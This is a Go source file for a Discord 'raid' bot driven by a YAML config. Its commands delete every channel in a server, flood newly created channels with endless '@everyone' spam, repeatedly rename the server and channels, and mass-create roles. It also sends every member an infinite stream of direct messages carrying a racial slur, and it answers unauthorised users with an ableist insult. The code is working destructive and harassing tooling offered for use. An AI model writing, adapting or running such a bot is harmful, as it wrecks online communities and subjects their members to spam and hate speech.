package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"gopkg.in/yaml.v3"
)

type Config struct {
	Bot struct {
		Token      string   `yaml:"token"`
		AllowedIds []string `yaml:"allowedIds"`

		Status struct {
			Messages []string `yaml:"messages"`
		} `yaml:"status"`

		Raid struct {
			Messages     []string `yaml:"messages"`
			MessageDelay int      `yaml:"messageDelay"`
			GuildEdit    struct {
				Enable bool     `yaml:"enable"`
				Names  []string `yaml:"names"`
				Delay  int      `yaml:"delay"`
			} `yaml:"guildEdit"`
			Channels struct {
				Names  []string `yaml:"names"`
				Amount int      `yaml:"amount"`
				Edit   struct {
					Enable bool `yaml:"enable"`
					Delay  int  `yaml:"delay"`
				} `yaml:"edit"`
			} `yaml:"channels"`
			Roles struct {
				Enable bool     `yaml:"enable"`
				Names  []string `yaml:"names"`
				Amount int      `yaml:"amount"`
				Delay  int      `yaml:"delay"`
			} `yaml:"roles"`
		} `yaml:"raid"`
	} `yaml:"bot"`
}

var config Config

func main() {
	data, err := os.ReadFile("config.yaml")

	if err := yaml.Unmarshal(data, &config); err != nil {
		panic(err)
	}

	// Create a new Discord session using the provided bot token.
	dg, err := discordgo.New("Bot " + config.Bot.Token)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	println(config.Bot.Status.Messages[0])

	ticker := time.Tick(5 * time.Second)

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)

	statuses := config.Bot.Status.Messages
	statusIndex := 0

	dg.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
		fmt.Println(fmt.Sprintf("Bot is ready on Shard %d", r.Shard))

		for {
			select {
			case <-ticker:
				dg.UpdateGameStatus(0, statuses[statusIndex])
				statusIndex = (statusIndex + 1) % len(statuses)
			case <-stop:
				// Handle cleanup or any necessary finalization
				fmt.Println("Received termination signal. Exiting...")
				return
			}
		}

	})

	dg.AddHandler(func(s *discordgo.Session, r *discordgo.RateLimit) {
		fmt.Println(fmt.Sprintf("(!) RATELIMITED (retry after: %f seconds)", r.RetryAfter.Seconds()))
	})

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)

	// In this example, we only care about receiving message events.
	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsGuildMembers

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	// Cleanly close down the Discord session.
	dg.Close()
}

// This function will be called (due to AddHandler above) every time a new
// message is created on any channel that the authenticated bot has access to.
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore all messages created by the bot itself
	// This isn't required in this specific example but it's a good practice.
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == "-delchannels" {
		if m.Author.ID != "890320508984377354" {
			s.ChannelMessageSend(m.ChannelID, "are you autistic?")
			return
		}

		channels, err := s.GuildChannels(m.GuildID)

		if err != nil {
			fmt.Println("error fetching guild channels for " + m.GuildID)
			return
		}

		for _, channel := range channels {
			go s.ChannelDelete(channel.ID)
		}

	}

	if m.Content == "-members" {
		members, err := s.GuildMembers(m.GuildID, "", 1000)

		if err != nil {
			fmt.Println("error getting guild members for" + m.GuildID)
			return
		}

		for _, m := range members {

			if m.User.Bot {
				return
			}

			println(m.User.ID)
			userChannel, err := s.UserChannelCreate(m.User.ID)

			println("userChannel: " + userChannel.ID)

			if err != nil {
				fmt.Println("error creating channel for user " + m.User.ID)
				return
			}
		}

	}

	if m.Content == "-jussi" {
		if m.Author.ID != "890320508984377354" {
			s.ChannelMessageSend(m.ChannelID, "are you autistic?")
			return
		}

		go createChnlMsgs(m.GuildID, s)

		if config.Bot.Raid.GuildEdit.Enable == true {
			go spamGuildEdit(m.GuildID, s)
		}

		if config.Bot.Raid.Roles.Enable == true {
			go spamRoleCreate(m.GuildID, s)
		}

		members, err := s.GuildMembers(m.GuildID, "", 1000)

		if err != nil {
			fmt.Println("error getting guild members for" + m.GuildID)
			return
		}

		for _, m := range members {

			if m.User.Bot {
				return
			}

			println(m.User.ID)
			userChannel, err := s.UserChannelCreate(m.User.ID)

			if err != nil {
				fmt.Println("error creating channel for user " + m.User.ID)
				return
			}

			go sendMsgToMembers(userChannel, s)
		}
	}
}

func sendMsgToMembers(userChannel *discordgo.Channel, s *discordgo.Session) {
	time.Sleep(3 * time.Second)
	for {
		s.ChannelMessageSend(userChannel.ID, "neekeri!")
	}
}

func createChnlMsgs(gid string, s *discordgo.Session) {
	amount := config.Bot.Raid.Channels.Amount

	fmt.Printf("Creating %d channels\n", amount)

	channels := createChannels(gid, s)

	fmt.Printf("Done creating %d channels. Starting to spam messages to the channels.\n", amount)

	for _, ch := range channels {
		go spamMessages(ch, s)

		if config.Bot.Raid.Channels.Edit.Enable == true {
			go spamChannelEdit(ch, s)
		}
	}
}

func spamMessages(channelID string, s *discordgo.Session) {
	messages := config.Bot.Raid.Messages
	sendTicker := time.NewTicker(time.Duration(config.Bot.Raid.MessageDelay) * time.Millisecond)

	for {
		select {
		case <-sendTicker.C:
			println("(TICK) Sending msg to channel " + channelID)
			randomIndex := rand.Intn(len(messages))
			_, err := s.ChannelMessageSend(channelID, "@everyone"+messages[randomIndex])

			if err != nil {
				println("error sending msg to chn " + channelID)
			}
		}
	}
}

func createChannels(gid string, s *discordgo.Session) (channelIDs []string) {
	channelNames := config.Bot.Raid.Channels.Names
	amount := config.Bot.Raid.Channels.Amount

	var ids []string

	for i := 0; i < amount; i++ {
		randomIndex := rand.Intn(len(channelNames))
		channel, err := s.GuildChannelCreate(gid, channelNames[randomIndex], 0)

		fmt.Printf("")

		println(err.Error())

		if err != nil {
			println("fail creating channel")
		} else {
			ids = append(ids, channel.ID)
		}
	}

	return ids
}

func spamRoleCreate(gid string, s *discordgo.Session) {
	roleNames := config.Bot.Raid.Roles.Names
	amount := config.Bot.Raid.Roles.Amount

	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.Roles.Delay) * time.Millisecond)

	for i := 0; i < amount; i++ {
		select {
		case <-editTicker.C:
			println("(TICK) Creating new role")
			randomIndex := rand.Intn(len(roleNames))
			_, err := s.GuildRoleCreate(gid, &discordgo.RoleParams{
				Name: roleNames[randomIndex],
			})

			if err != nil {
				println("error creating new role for gid " + gid)
			}
		}
	}
}
func spamGuildEdit(gid string, s *discordgo.Session) {
	names := config.Bot.Raid.GuildEdit.Names
	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.GuildEdit.Delay) * time.Millisecond)

	for {
		select {
		case <-editTicker.C:
			println("(TICK) Changing guild name")
			randomIndex := rand.Intn(len(names))
			_, err := s.GuildEdit(gid, &discordgo.GuildParams{
				Name: names[randomIndex],
			})

			if err != nil {
				println("error editing channel for gid " + gid)
			}
		}
	}
}

func spamChannelEdit(channelID string, s *discordgo.Session) {
	messages := config.Bot.Raid.Messages
	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.Channels.Edit.Delay) * time.Millisecond)

	for {
		select {
		case <-editTicker.C:
			randomIndex := rand.Intn(len(messages))
			s.ChannelEdit(channelID, &discordgo.ChannelEdit{
				Name: messages[randomIndex],
			})
		}
	}
}
